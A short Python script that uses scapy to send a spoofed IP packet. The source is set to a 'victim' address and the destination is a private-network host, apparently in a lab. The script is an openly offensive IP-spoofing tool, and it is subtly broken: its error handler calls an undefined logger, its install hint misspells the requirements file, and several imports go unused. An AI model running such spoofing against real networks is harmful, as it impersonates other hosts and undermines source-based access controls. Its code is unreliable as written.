# coding: utf8
# vi: ft=python expandtab ts=4 sts=4 sw=4

import logging

try:
    from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp
except ImportError as exc:
    _log.fatal(
        "You need scapy to run this program "
        "run this command: sudo python3 -m pip install -r requitements.txt"
    )

def ip_spoofing(ip_victim: str):
    """Try ip spoofingg

    Args:
        ip_victim (str): IP took from the victim
    """
    sendp(Ether()/IP(src=ip_victim,dst="192.168.33.1"), iface="ens3")

if __name__ == '__main__':
    src_ip = "192.168.33.10"
    ip_spoofing(src_ip)
